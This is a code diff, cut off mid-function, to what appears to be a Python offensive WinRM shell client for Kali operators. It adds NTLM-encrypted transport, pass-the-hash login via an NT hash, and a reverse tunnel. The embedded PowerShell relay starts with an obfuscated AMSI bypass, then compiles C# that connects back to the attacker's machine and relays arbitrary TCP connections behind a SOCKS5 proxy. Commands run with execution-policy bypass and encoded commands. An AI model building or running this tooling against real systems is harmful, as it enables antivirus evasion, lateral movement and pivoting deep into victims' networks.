@@ -48,7 +48,7 @@ except ImportError:
     except ImportError:
         readline = None
 
-# ── ANSI colors ──────────────────────────────────────────────────────────────
+# -- ANSI colors ---------------------------------------------------------------
 
 if sys.platform == "win32":
     os.system("")  # enable VT100 on Windows 10+
@@ -65,6 +65,7 @@ class C:
     RESET   = "\033[0m"
 
 NO_COLOR = False
+DEBUG = False
 
 def co(text, color):
     if NO_COLOR:
@@ -83,14 +84,16 @@ def warn(msg):
 def error(msg):
     print(co("[-] ", C.RED) + msg)
 
-# ── WSMan protocol constants ────────────────────────────────────────────────
+# -- WSMan protocol constants --------------------------------------------------
 
-XMLNS_SOAP    = "http://www.w3.org/2003/05/soap-envelope"
-XMLNS_WSA     = "http://schemas.xmlsoap.org/ws/2004/08/addressing"
-XMLNS_WSMAN   = "http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
-XMLNS_RSP     = "http://schemas.microsoft.com/wbem/wsman/1/windows/shell"
-ANONYMOUS     = "http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous"
-RESOURCE_CMD  = "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd"
+XMLNS_SOAP      = "http://www.w3.org/2003/05/soap-envelope"
+XMLNS_WSA       = "http://schemas.xmlsoap.org/ws/2004/08/addressing"
+XMLNS_WSMAN     = "http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
+XMLNS_WSMAN_MS  = "http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"
+XMLNS_RSP       = "http://schemas.microsoft.com/wbem/wsman/1/windows/shell"
+XMLNS_FAULT     = "http://schemas.microsoft.com/wbem/wsman/1/wsmanfault"
+ANONYMOUS       = "http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous"
+RESOURCE_CMD    = "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd"
 
 ACTION_CREATE  = "http://schemas.xmlsoap.org/ws/2004/09/transfer/Create"
 ACTION_DELETE  = "http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete"
@@ -103,13 +106,85 @@ STATE_DONE     = "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Comman
 
 CHUNK_SIZE = 102400  # 100 KB for file transfers
 
-# ── Tunnel relay script (runs on the target) ─────────────────────────────────
+# -- NTLM Message Encryption (MS-WSMV 2.2.9.1) --------------------------------
+
+MIME_BOUNDARY = b"--Encrypted Boundary"
+PROTOCOL_STRING = b"application/HTTP-SPNEGO-session-encrypted"
+
+
+class NTLMEncryption:
+    """Encrypt/decrypt WinRM SOAP payloads with NTLM session security.
+
+    Windows WinRM defaults to AllowUnencrypted=false, requiring message-level
+    encryption when using HTTP (not HTTPS). This class wraps SOAP messages
+    using the NTLM session key negotiated during HTTP authentication.
+    """
+
+    def __init__(self, session):
+        self.session = session
+
+    def encrypt(self, message_bytes):
+        """Encrypt a SOAP message, return (body_bytes, content_type_header)."""
+        sealed, signature = self.session.auth.session_security.wrap(message_bytes)
+        sig_len = struct.pack("<i", len(signature))
+        encrypted_stream = sig_len + signature + sealed
+        msg_len = str(len(message_bytes)).encode()
+
+        payload = (
+            MIME_BOUNDARY + b"\r\n"
+            b"\tContent-Type: " + PROTOCOL_STRING + b"\r\n"
+            b"\tOriginalContent: type=application/soap+xml;charset=UTF-8;"
+            b"Length=" + msg_len + b"\r\n"
+            + MIME_BOUNDARY + b"\r\n"
+            b"\tContent-Type: application/octet-stream\r\n"
+            + encrypted_stream
+            + MIME_BOUNDARY + b"--\r\n"
+        )
+        ct = (
+            'multipart/encrypted;'
+            f'protocol="{PROTOCOL_STRING.decode()}";'
+            'boundary="Encrypted Boundary"'
+        )
+        return payload, ct
+
+    def decrypt(self, response):
+        """Decrypt a WinRM response if it is encrypted, else return raw bytes."""
+        ct = response.headers.get("Content-Type", "")
+        if PROTOCOL_STRING.decode() not in ct:
+            return response.content
+
+        parts = response.content.split(MIME_BOUNDARY + b"\r\n")
+        parts = [p for p in parts if p]
+        message = b""
+        for i in range(0, len(parts), 2):
+            header = parts[i].strip()
+            payload = parts[i + 1] if i + 1 < len(parts) else b""
+
+            expected_length = int(header.split(b"Length=")[1])
+            if payload.endswith(MIME_BOUNDARY + b"--\r\n"):
+                payload = payload[: -len(MIME_BOUNDARY + b"--\r\n")]
+            encrypted_data = payload.replace(
+                b"\tContent-Type: application/octet-stream\r\n", b""
+            )
+
+            sig_len_val = struct.unpack("<i", encrypted_data[:4])[0]
+            signature = encrypted_data[4: sig_len_val + 4]
+            sealed_msg = encrypted_data[sig_len_val + 4:]
+            decrypted = self.session.auth.session_security.unwrap(sealed_msg, signature)
+
+            if len(decrypted) != expected_length:
+                raise WinRMError("Decrypted length mismatch - message may be tampered")
+            message += decrypted
+        return message
+
+# -- Tunnel relay script (runs on the target) ----------------------------------
 
 RELAY_PS = r"""
 $ErrorActionPreference='Stop'
 $c=[Net.Sockets.TcpClient]::new()
-$c.SendTimeout=5000
-$c.ReceiveTimeout=500
+$c.SendTimeout=10000
+$c.ReceiveTimeout=1000
+$c.NoDelay=$true
 try{$c.Connect('__HOST__',__PORT__)}catch{[Console]::Error.WriteLine($_);exit 1}
 $s=$c.GetStream()
 $i=[Console]::OpenStandardInput()
@@ -130,13 +205,89 @@ $n=$i.EndRead($ia)
 if($n -gt 0){$s.Write($ib,0,$n);$s.Flush()}else{break}
 $ia=$null
 }
-[Threading.Thread]::Sleep(10)
+[Threading.Thread]::Sleep(1)
 }
 }catch{}
 try{$c.Close()}catch{}
 """.strip()
 
-# ── WinRM Client ─────────────────────────────────────────────────────────────
+# -- Reverse tunnel relay script (runs on the target) --------------------------
+# Multiplexed TCP tunnel: connects back to Kali over a single TCP connection,
+# then opens/relays multiple TCP connections on demand (SOCKS-driven).
+# Frame format: [1B type][2B channel BE][4B length BE][payload]
+# Types: 0x01=CONNECT, 0x02=CONNECT_RESP, 0x03=DATA, 0x04=CLOSE, 0xFF=READY
+
+TUNNEL_RELAY_PS = r"""
+try{$e=[Text.Encoding]::UTF8;$t=[Ref].Assembly.GetType($e.GetString([Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM=")));$f=$t.GetField($e.GetString([Convert]::FromBase64String("YW1zaUluaXRGYWlsZWQ=")),"NonPublic,Static");$f.SetValue($null,$true)}catch{}
+$code=@"
+using System;
+using System.Collections.Concurrent;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading;
+
+public class R{
+    static NetworkStream ms;
+    static ConcurrentDictionary<int,TcpClient> ch=new ConcurrentDictionary<int,TcpClient>();
+    static object wl=new object();
+
+    static void WF(byte t,int c,byte[] d,int n){
+        var h=new byte[7];
+        h[0]=t;h[1]=(byte)(c>>8);h[2]=(byte)c;
+        h[3]=(byte)(n>>24);h[4]=(byte)(n>>16);h[5]=(byte)(n>>8);h[6]=(byte)n;
+        lock(wl){ms.Write(h,0,7);if(n>0)ms.Write(d,0,n);ms.Flush();}
+    }
+
+    static byte[] RX(int n){
+        var b=new byte[n];int o=0;
+        while(o<n){int r=ms.Read(b,o,n-o);if(r==0)return null;o+=r;}
+        return b;
+    }
+
+    static void CR(object state){
+        var a=(object[])state;var tc=(TcpClient)a[0];int ci=(int)a[1];
+        var buf=new byte[65536];
+        try{var ts=tc.GetStream();
+            while(true){int n=ts.Read(buf,0,buf.Length);if(n<=0)break;WF(3,ci,buf,n);}
+        }catch{}
+        WF(4,ci,new byte[0],0);
+        TcpClient rm;ch.TryRemove(ci,out rm);
+    }
+
+    public static void Run(string host,int port){
+        var c=new TcpClient();c.NoDelay=true;
+        c.SendBufferSize=262144;c.ReceiveBufferSize=262144;
+        c.Connect(host,port);ms=c.GetStream();
+        WF(0xFF,0,new byte[]{1},1);
+        while(c.Connected){
+            var h=RX(7);if(h==null)break;
+            int t=h[0],ci=(h[1]<<8)|h[2],ln=(h[3]<<24)|(h[4]<<16)|(h[5]<<8)|h[6];
+            var d=ln>0?RX(ln):new byte[0];if(d==null)break;
+            if(t==1){
+                var tgt=Encoding.ASCII.GetString(d);var p=tgt.Split(':');
+                try{var tc=new TcpClient();tc.NoDelay=true;
+                    tc.SendBufferSize=262144;tc.ReceiveBufferSize=262144;
+                    tc.Connect(p[0],int.Parse(p[1]));
+                    ch[ci]=tc;WF(2,ci,new byte[]{0},1);
+                    ThreadPool.QueueUserWorkItem(CR,new object[]{tc,ci});
+                }catch{WF(2,ci,new byte[]{1},1);}
+            }else if(t==3){
+                TcpClient tc;if(ch.TryGetValue(ci,out tc))
+                    try{tc.GetStream().Write(d,0,d.Length);}catch{}
+            }else if(t==4){
+                TcpClient rm;if(ch.TryRemove(ci,out rm))try{rm.Close();}catch{}
+            }
+        }
+        foreach(var kv in ch)try{kv.Value.Close();}catch{}
+        c.Close();
+    }
+}
+"@
+Add-Type -TypeDefinition $code
+[R]::Run('__KALI__',__PORT__)
+""".strip()
+
+# -- WinRM Client --------------------------------------------------------------
 
 class WinRMError(Exception):
     pass
@@ -159,7 +310,14 @@ class WinRMClient:
         self.session.headers.update({
             "Content-Type": "application/soap+xml;charset=UTF-8",
             "User-Agent": "Microsoft WinRM Client",
+            "Connection": "Keep-Alive",
         })
+
+        self.encryption = None
+        self.auth_type = auth_type
+        self._ntlm_user = None
+        self._ntlm_pass = None
+        self._use_ssl = use_ssl
 
         if auth_type == "kerberos":
             if not HAS_KERBEROS:
@@ -171,12 +329,53 @@ class WinRMClient:
             user = f"{domain}\\{username}" if domain else username
             if nt_hash:
                 password = f"aad3b435b51404eeaad3b435b51404ee:{nt_hash}"
+            self._ntlm_user = user
+            self._ntlm_pass = password
             self.session.auth = HttpNtlmAuth(user, password)
+            # NTLM message encryption is required for HTTP (AllowUnencrypted=false)
+            if not use_ssl:
+                self._init_ntlm_encryption()
         elif auth_type == "basic":
             self.session.auth = HTTPBasicAuth(username, password)
 
+    def _init_ntlm_encryption(self):
+        """Send a blank request to establish the NTLM security context,
+        then set up message encryption using the negotiated session key."""
+        try:
+            r = self.session.post(self.endpoint, data=None, timeout=self.timeout)
+            # 401/200 both acceptable here - the goal is to complete NTLM handshake
+        except requests.ConnectionError:
+            pass  # will fail later on real requests
+
+        if hasattr(self.session.auth, "session_security") and self.session.auth.session_security:
+            self.encryption = NTLMEncryption(self.session)
+            if DEBUG:
+                info("NTLM message encryption enabled")
+        elif DEBUG:
+            warn("NTLM session_security not available, sending unencrypted")
+
+    def _rebuild_session(self):
+        """Recreate HTTP session and NTLM encryption from scratch."""
+        old_verify = self.session.verify
+        old_headers = dict(self.session.headers)
+        try:
+            self.session.close()
+        except Exception:
+            pass
+        self.shell_id = None
+        self.encryption = None
+        self.session = requests.Session()
+        self.session.verify = old_verify
+        self.session.headers.update(old_headers)
+        if self.auth_type == "ntlm" and self._ntlm_user:
+            self.session.auth = HttpNtlmAuth(self._ntlm_user, self._ntlm_pass)
+            if not self._use_ssl:
+                self._init_ntlm_encryption()
+        elif self.auth_type == "kerberos":
+            self.session.auth = HTTPKerberosAuth(mutual_authentication=REQUIRED)
+
     def clone(self):
-        """Create an independent clone sharing credentials but with its own HTTP session."""
+        """Create an independent clone with its own HTTP session and NTLM context."""
         c = WinRMClient.__new__(WinRMClient)
         c.endpoint = self.endpoint
         c.host = self.host
@@ -184,16 +383,27 @@ class WinRMClient:
         c.shell_id = None
         c._cwd_marker = self._cwd_marker
         c._lock = threading.RLock()
+        c.auth_type = self.auth_type
+        c._ntlm_user = self._ntlm_user
+        c._ntlm_pass = self._ntlm_pass
+        c._use_ssl = self._use_ssl
+        c.encryption = None
         c.session = requests.Session()
         c.session.verify = self.session.verify
-        c.session.auth = self.session.auth
         c.session.headers.update(self.session.headers)
+        # Each clone needs its own auth object (NTLM session security is stateful)
+        if self.auth_type == "ntlm" and self._ntlm_user:
+            c.session.auth = HttpNtlmAuth(self._ntlm_user, self._ntlm_pass)
+            if self.encryption:
+                c._init_ntlm_encryption()
+        else:
+            c.session.auth = self.session.auth
         return c
 
-    # ── SOAP envelope builder ────────────────────────────────────────────
+    # -- SOAP envelope builder -------------------------------------------------
 
     def _envelope(self, action, body="", shell_id=None, options=None,
-                  max_env=512000, op_timeout=None):
+                  max_env=153600, op_timeout=None):
         msg_id = uuid.uuid4()
         timeout = op_timeout if op_timeout is not None else self.timeout
         selector = ""
@@ -214,7 +424,8 @@ class WinRMClient:
         return (
             f'<?xml version="1.0" encoding="UTF-8"?>'
             f'<s:Envelope xmlns:s="{XMLNS_SOAP}" xmlns:wsa="{XMLNS_WSA}" '
-            f'xmlns:wsman="{XMLNS_WSMAN}" xmlns:rsp="{XMLNS_RSP}">'
+            f'xmlns:wsman="{XMLNS_WSMAN}" xmlns:p="{XMLNS_WSMAN_MS}" '
+            f'xmlns:rsp="{XMLNS_RSP}">'
             f'<s:Header>'
             f'<wsa:To>{self.endpoint}</wsa:To>'
             f'<wsman:ResourceURI s:mustUnderstand="true">{RESOURCE_CMD}</wsman:ResourceURI>'
@@ -225,6 +436,7 @@ class WinRMClient:
             f'<wsman:MaxEnvelopeSize s:mustUnderstand="true">{max_env}</wsman:MaxEnvelopeSize>'
             f'<wsa:MessageID>uuid:{msg_id}</wsa:MessageID>'
             f'<wsman:Locale xml:lang="en-US" s:mustUnderstand="false"/>'
+            f'<p:DataLocale xml:lang="en-US" s:mustUnderstand="false"/>'
             f'<wsman:OperationTimeout>PT{timeout}S</wsman:OperationTimeout>'
             f'{selector}{opt_set}'
             f'</s:Header>'
@@ -232,17 +444,28 @@ class WinRMClient:
             f'</s:Envelope>'
         )
 
-    # ── HTTP transport ───────────────────────────────────────────────────
+    # -- HTTP transport --------------------------------------------------------
 
-    def _send(self, xml_payload, http_timeout=None):
+    def _send(self, xml_payload, http_timeout=None, quiet=False):
         timeout = http_timeout if http_timeout is not None else self.timeout + 10
         with self._lock:
             try:
-                r = self.session.post(
-                    self.endpoint,
-                    data=xml_payload.encode("utf-8"),
-                    timeout=timeout,
-                )
+                if self.encryption:
+                    body_bytes, content_type = self.encryption.encrypt(
+                        xml_payload.encode("utf-8")
+                    )
+                    r = self.session.post(
+                        self.endpoint,
+                        data=body_bytes,
+                        timeout=timeout,
+                        headers={"Content-Type": content_type},
+                    )
+                else:
+                    r = self.session.post(
+                        self.endpoint,
+                        data=xml_payload.encode("utf-8"),
+                        timeout=timeout,
+                    )
             except requests.ConnectionError as e:
                 raise WinRMError(f"Connection failed: {e}")
             except requests.Timeout:
@@ -253,26 +476,60 @@ class WinRMClient:
         if r.status_code == 403:
             raise WinRMError("Access denied (403)")
 
+        # Decrypt response if encrypted
+        if self.encryption:
+            response_data = self.encryption.decrypt(r)
+            response_text = response_data.decode("utf-8", errors="replace")
+        else:
+            response_text = r.text
+
         if r.status_code not in (200,):
-            fault = self._parse_fault(r.text)
+            if DEBUG and not quiet:
+                warn(f"HTTP {r.status_code} raw response:\n{response_text[:2000]}")
+            fault = self._parse_fault(response_text)
             raise WinRMError(fault or f"HTTP {r.status_code}")
 
-        return ET.fromstring(r.text)
+        return ET.fromstring(response_text)
 
     def _parse_fault(self, xml_text):
+        """Parse SOAP fault responses, including Microsoft WSManFault details."""
         try:
             root = ET.fromstring(xml_text)
-            reason = root.find(".//{%s}Text" % XMLNS_SOAP)
-            if reason is not None and reason.text:
-                return reason.text
-            detail = root.find(".//{%s}WSManFault" % XMLNS_WSMAN)
-            if detail is not None:
-                return detail.get("Message", "Unknown WSMan fault")
         except ET.ParseError:
-            pass
-        return None
+            return None
 
-    # ── Shell lifecycle ──────────────────────────────────────────────────
+        # Extract SOAP Reason text
+        reason = root.find(".//{%s}Text" % XMLNS_SOAP)
+        reason_text = reason.text.strip() if (reason is not None and reason.text) else ""
+
+        # Look for WSManFault in the correct Microsoft namespace
+        detail = root.find(".//{%s}WSManFault" % XMLNS_FAULT)
+        if detail is not None:
+            code = detail.get("Code", "")
+            # Message can be an attribute or a child element
+            msg = detail.get("Message", "")
+            msg_el = detail.find("{%s}Message" % XMLNS_FAULT)
+            if msg_el is not None and msg_el.text:
+                msg = msg_el.text.strip()
+            # Also check for ProviderFault inside Message element
+            if msg_el is not None:
+                pf = msg_el.find(".//{%s}ProviderFault" % XMLNS_FAULT)
+                if pf is not None and pf.text:
+                    msg = pf.text.strip()
+            fault_str = f"WSManFault {code}: {msg}" if code else msg
+            if reason_text:
+                fault_str = f"{reason_text} -- {fault_str}"
+            return fault_str if fault_str.strip() else None
+
+        # Fallback: try the old DMTF namespace (some non-Microsoft implementations)
+        detail_old = root.find(".//{%s}WSManFault" % XMLNS_WSMAN)
+        if detail_old is not None:
+            msg = detail_old.get("Message", "Unknown WSMan fault")
+            return msg
+
+        return reason_text or None
+
+    # -- Shell lifecycle -------------------------------------------------------
 
     def create_shell(self, codepage=65001, noprofile=True):
         """Create a new shell, return its ID without setting it as default."""
@@ -312,7 +569,7 @@ class WinRMClient:
         if not self.shell_id:
             self.open_shell()
 
-    # ── Command execution ────────────────────────────────────────────────
+    # -- Command execution -----------------------------------------------------
 
     def run_command(self, shell_id, command, args=None):
         arg_xml = ""
@@ -385,7 +642,7 @@ class WinRMClient:
         xml = self._envelope(ACTION_RECEIVE, body, shell_id,
                              max_env=8388608, op_timeout=timeout)
         try:
-            root = self._send(xml, http_timeout=timeout + 10)
+            root = self._send(xml, http_timeout=timeout + 5, quiet=True)
         except WinRMError:
             return b"", b"", False
 
@@ -436,7 +693,7 @@ class WinRMClient:
             self.signal_terminate(self.shell_id, cmd_id)
         return stdout, stderr, rc
 
-    # ── PowerShell execution ─────────────────────────────────────────────
+    # -- PowerShell execution --------------------------------------------------
 
     def _ps_encode(self, ps_command):
         return base64.b64encode(
@@ -471,37 +728,53 @@ class WinRMClient:
             stdout_clean = stdout_clean[:-1]
         return stdout_clean, stderr, rc, new_cwd
 
-    # ── File transfer ────────────────────────────────────────────────────
+    # -- File transfer ---------------------------------------------------------
 
     def upload(self, local_path, remote_path, progress_cb=None):
         with open(local_path, "rb") as f:
             data = f.read()
 
         total = len(data)
-        uploaded = 0
+        self._ensure_shell()
 
-        for offset in range(0, total, CHUNK_SIZE):
-            chunk = data[offset : offset + CHUNK_SIZE]
-            b64 = base64.b64encode(chunk).decode("ascii")
+        ps = (
+            '$i=[Console]::OpenStandardInput();'
+            '$h=New-Object byte[] 8;$r=0;'
+            'while($r -lt 8){$n=$i.Read($h,$r,8-$r);if($n -le 0){exit 1};$r+=$n};'
+            '$sz=[BitConverter]::ToInt64($h,0);'
+            f'$f=[IO.File]::Create("{remote_path}");'
+            '$b=New-Object byte[] 65536;$w=[long]0;'
+            'while($w -lt $sz){'
+            '$n=$i.Read($b,0,[Math]::Min($b.Length,$sz-$w));'
+            'if($n -le 0){break};$f.Write($b,0,$n);$w+=$n};'
+            '$f.Close();Write-Output "DONE:$w"'
+        )
+        encoded = self._ps_encode(ps)
+        cmd_id = self.run_command(
+            self.shell_id, "powershell.exe",
+            ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass",
+             "-EncodedCommand", encoded]
+        )
 
-            if offset == 0:
-                ps = (
-                    f'$b=[Convert]::FromBase64String("{b64}");'
-                    f'[IO.File]::WriteAllBytes("{remote_path}",$b)'
-                )
-            else:
-                ps = (
-                    f'$s=[IO.File]::OpenWrite("{remote_path}");'
-                    f'$s.Seek(0,[IO.SeekOrigin]::End)|Out-Null;'
-                    f'$b=[Convert]::FromBase64String("{b64}");'
-                    f'$s.Write($b,0,$b.Length);$s.Close()'
-                )
-            stdout, stderr, rc = self.execute_ps(ps)
-            if rc != 0:
-                raise WinRMError(f"Upload chunk failed: {stderr.strip()}")
-            uploaded += len(chunk)
-            if progress_cb:
-                progress_cb(uploaded, total)
+        try:
+            self.send_input(self.shell_id, cmd_id, struct.pack('<q', total))
+
+            uploaded = 0
+            for offset in range(0, total, CHUNK_SIZE):
+                chunk = data[offset:offset + CHUNK_SIZE]
+                self.send_input(self.shell_id, cmd_id, chunk)
+                uploaded += len(chunk)
+                if progress_cb:
+                    progress_cb(uploaded, total)
+
+            stdout, stderr, rc = self.get_output(self.shell_id, cmd_id)
+        finally:
+            self.signal_terminate(self.shell_id, cmd_id)
+
+        if rc != 0 or "DONE:" not in (stdout or ""):
+            raise WinRMError(
+                f"Upload failed: {(stderr or stdout or 'unknown error').strip()}"
+            )
 
         return total
 
@@ -543,13 +816,17 @@ class WinRMClient:
         self.session.close()
 
 
-# ── SOCKS5 Proxy over WinRM ─────────────────────────────────────────────────
+# -- SOCKS5 Proxy over WinRM --------------------------------------------------
 
 class TunnelConnection:
-    """Manages a single SOCKS‑proxied TCP connection relayed through WinRM."""
+    """Manages a single SOCKS-proxied TCP connection relayed through WinRM."""
 
     def __init__(self, main_client, local_sock, addr):
-        self.tunnel_client = main_client.clone()
+        # Separate clients for reader/writer to avoid lock contention:
+        # WinRM Receive polls block for seconds; if reader and writer share
+        # a lock, the writer can't send data while the reader waits.
+        self.read_client = main_client.clone()
+        self.write_client = main_client.clone()
         self.local_sock = local_sock
         self.addr = addr
         self.active = True
@@ -565,18 +842,18 @@ class TunnelConnection:
             self.dst = dst
             host, port = dst
 
-            self.shell_id = self.tunnel_client.create_shell()
+            self.shell_id = self.write_client.create_shell()
 
             script = RELAY_PS.replace("__HOST__", host).replace("__PORT__", str(port))
-            encoded = self.tunnel_client._ps_encode(script)
-            self.command_id = self.tunnel_client.run_command(
+            encoded = self.write_client._ps_encode(script)
+            self.command_id = self.write_client.run_command(
                 self.shell_id, "powershell.exe",
                 ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass",
                  "-EncodedCommand", encoded]
             )
 
             # Wait for connection confirmation (byte 0x01)
-            stdout, stderr, done = self.tunnel_client.receive_partial(
+            stdout, stderr, done = self.read_client.receive_partial(
                 self.shell_id, self.command_id, timeout=15
             )
             if done or (not stdout) or stdout[0:1] != b"\x01":
@@ -609,11 +886,12 @@ class TunnelConnection:
             self.close()
 
     def _relay_remote_to_local(self):
-        """Poll WinRM Receive and forward stdout bytes to the local SOCKS client."""
+        """Long-poll WinRM Receive: the server holds the response until data
+        is available, then responds immediately (~70ms). No wasted idle polls."""
         while self.active:
             try:
-                stdout, _, done = self.tunnel_client.receive_partial(
-                    self.shell_id, self.command_id, timeout=2
+                stdout, _, done = self.read_client.receive_partial(
+                    self.shell_id, self.command_id, timeout=10
                 )
                 if stdout:
                     self.local_sock.sendall(stdout)
@@ -627,11 +905,11 @@ class TunnelConnection:
         """Read from local SOCKS client and send to the remote via WinRM Send."""
         while self.active:
             try:
-                self.local_sock.settimeout(1.0)
+                self.local_sock.settimeout(2.0)
                 data = self.local_sock.recv(65536)
                 if not data:
                     break
-                self.tunnel_client.send_input(
+                self.write_client.send_input(
                     self.shell_id, self.command_id, data
                 )
             except socket.timeout:
@@ -689,16 +967,17 @@ class TunnelConnection:
     def close(self):
         self.active = False
         if self.command_id and self.shell_id:
-            self.tunnel_client.signal_terminate(self.shell_id, self.command_id)
+            self.write_client.signal_terminate(self.shell_id, self.command_id)
             self.command_id = None
         if self.shell_id:
-            self.tunnel_client.close_shell(self.shell_id)
+            self.write_client.close_shell(self.shell_id)
             self.shell_id = None
         try:
             self.local_sock.close()
         except OSError:
             pass
-        self.tunnel_client.session.close()
+        self.read_client.session.close()
+        self.write_client.session.close()
 
 
 class SocksProxy:
@@ -760,7 +1039,320 @@ class SocksProxy:
         return len(self.tunnels)
 
 
-# ── Interactive Shell ────────────────────────────────────────────────────────
+# -- Reverse TCP Tunnel (native, no external binary) ---------------------------
+
+class ReverseTunnel:
+    """Multiplexed reverse TCP tunnel with built-in SOCKS5 proxy.
+
+    Instead of relaying each packet through WinRM SOAP (slow), this opens a
+    single direct TCP connection from the target back to Kali. All SOCKS
+    traffic is multiplexed over that connection with minimal framing overhead.
+    """
+
+    CONNECT = 0x01
+    CONNECT_RESP = 0x02
+    DATA = 0x03
+    CLOSE = 0x04
+    READY = 0xFF
+
+    def __init__(self, winrm_client, listen_port=1080):
+        self.client = winrm_client
+        self.listen_port = listen_port
+        self.tunnel_port = 0
+        self.kali_ip = None
+        self.listener = None
+        self.tunnel_sock = None
+        self.socks_server = None
+        self.channels = {}
+        self._chan_events = {}
+        self._chan_results = {}
+        self._next_cid = 1
+        self._alloc_lock = threading.Lock()
+        self._write_lock = threading.Lock()
+        self.running = False
+
+    def _get_kali_ip(self):
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            s.connect((self.client.host, 80))
+            return s.getsockname()[0]
+        finally:
+            s.close()
+
+    @staticmethod
+    def _free_port():
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind(('', 0))
+        port = s.getsockname()[1]
+        s.close()
+        return port
+
+    def _write_frame(self, ftype, cid, data=b''):
+        header = struct.pack('>BHI', ftype, cid, len(data))
+        with self._write_lock:
+            self.tunnel_sock.sendall(header + data)
+
+    def _read_frame(self):
+        header = self._recv_exact(7)
+        if not header:
+            return None
+        ftype, cid, length = struct.unpack('>BHI', header)
+        data = self._recv_exact(length) if length else b''
+        if data is None:
+            return None
+        return ftype, cid, data
+
+    def _recv_exact(self, n):
+        buf = bytearray()
+        while len(buf) < n:
+            try:
+                chunk = self.tunnel_sock.recv(n - len(buf))
+                if not chunk:
+                    return None
+                buf.extend(chunk)
+            except (OSError, ConnectionError):
+                return None
+        return bytes(buf)
+
+    def _alloc_cid(self):
+        with self._alloc_lock:
+            cid = self._next_cid
+            self._next_cid = (cid % 65534) + 1
+            return cid
+
+    # -- Background threads ----------------------------------------------------
+
+    def _tunnel_reader(self):
+        """Read frames from the reverse connection and dispatch."""
+        while self.running:
+            frame = self._read_frame()
+            if not frame:
+                break
+            ftype, cid, data = frame
+            if ftype == self.CONNECT_RESP:
+                self._chan_results[cid] = data[0] if data else 1
+                evt = self._chan_events.get(cid)
+                if evt:
+                    evt.set()
+            elif ftype == self.DATA:
+                sock = self.channels.get(cid)
+                if sock:
+                    try:
+                        sock.sendall(data)
+                    except OSError:
+                        self._close_channel(cid)
+            elif ftype == self.CLOSE:
+                sock = self.channels.pop(cid, None)
+                if sock:
+                    try:
+                        sock.close()
+                    except OSError:
+                        pass
+        self.running = False
+
+    def _close_channel(self, cid):
+        sock = self.channels.pop(cid, None)
+        if sock:
+            try:
+                sock.close()
+            except OSError:
+                pass
+        try:
+            self._write_frame(self.CLOSE, cid)
+        except (OSError, ConnectionError):
+            pass
+
+    def _handle_socks(self, csock, addr):
+        """Handle one SOCKS5 client: handshake, then relay via tunnel."""
+        cid = None
+        try:
+            data = csock.recv(256)
+            if len(data) < 2 or data[0] != 0x05:
+                csock.close()
+                return
+            csock.sendall(b'\x05\x00')
+
+            data = csock.recv(512)
+            if len(data) < 7 or data[1] != 0x01:
+                csock.sendall(b'\x05\x07\x00\x01' + b'\x00' * 6)
+                csock.close()
+                return
+
+            atyp = data[3]
+            if atyp == 0x01:
+                dst = socket.inet_ntoa(data[4:8])
+                port = struct.unpack('!H', data[8:10])[0]
+            elif atyp == 0x03:
+                dlen = data[4]
+                dst = data[5:5 + dlen].decode('ascii', errors='replace')
+                port = struct.unpack('!H', data[5 + dlen:7 + dlen])[0]
+            elif atyp == 0x04:
+                dst = socket.inet_ntop(socket.AF_INET6, data[4:20])
+                port = struct.unpack('!H', data[20:22])[0]
+            else:
+                csock.sendall(b'\x05\x08\x00\x01' + b'\x00' * 6)
+                csock.close()
+                return
+
+            cid = self._alloc_cid()
+            self.channels[cid] = csock
+            self._chan_events[cid] = threading.Event()
+
+            self._write_frame(self.CONNECT, cid, f'{dst}:{port}'.encode())
+
+            if not self._chan_events[cid].wait(timeout=15):
+                csock.sendall(b'\x05\x04\x00\x01' + b'\x00' * 6)
+                self.channels.pop(cid, None)
+                self._chan_events.pop(cid, None)
+                csock.close()
+                return
+
+            result = self._chan_results.pop(cid, 1)
+            self._chan_events.pop(cid, None)
+
+            if result != 0:
+                csock.sendall(b'\x05\x05\x00\x01' + b'\x00' * 6)
+                self.channels.pop(cid, None)
+                csock.close()
+                return
+
+            csock.sendall(b'\x05\x00\x00\x01' + b'\x00' * 6)
+            csock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            csock.settimeout(0.5)
+
+            while self.running:
+                try:
+                    data = csock.recv(131072)
+                    if not data:
+                        break
+                    self._write_frame(self.DATA, cid, data)
+                except socket.timeout:
+                    if cid not in self.channels:
+                        break
+                    continue
+                except (OSError, ConnectionError):
+                    break
+
+            self._close_channel(cid)
+        except Exception:
+            if cid:
+                self._close_channel(cid)
+            try:
+                csock.close()
+            except OSError:
+                pass
+
+    def _socks_loop(self):
+        while self.running:
+            try:
+                self.socks_server.settimeout(1.0)
+                csock, addr = self.socks_server.accept()
+                threading.Thread(target=self._handle_socks,
+                                 args=(csock, addr), daemon=True).start()
+            except socket.timeout:
+                continue
+            except OSError:
+                break
+
+    # -- Public API ------------------------------------------------------------
+
+    def start(self, kali_ip=None):
+        self.kali_ip = kali_ip or self._get_kali_ip()
+        self.tunnel_port = self._free_port()
+
+        info(f"Kali IP: {self.kali_ip}")
+
+        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.listener.bind(('0.0.0.0', self.tunnel_port))
+        self.listener.listen(1)
+        self.listener.settimeout(45)
+        info(f"Listener on :{self.tunnel_port}, launching relay on target...")
+
+        script = (TUNNEL_RELAY_PS
+                  .replace('__KALI__', self.kali_ip)
+                  .replace('__PORT__', str(self.tunnel_port)))
+
+        def run_relay():
+            try:
+                c = self.client.clone()
+                sid = c.create_shell()
+                enc = c._ps_encode(script)
+                cid = c.run_command(sid, 'powershell.exe',
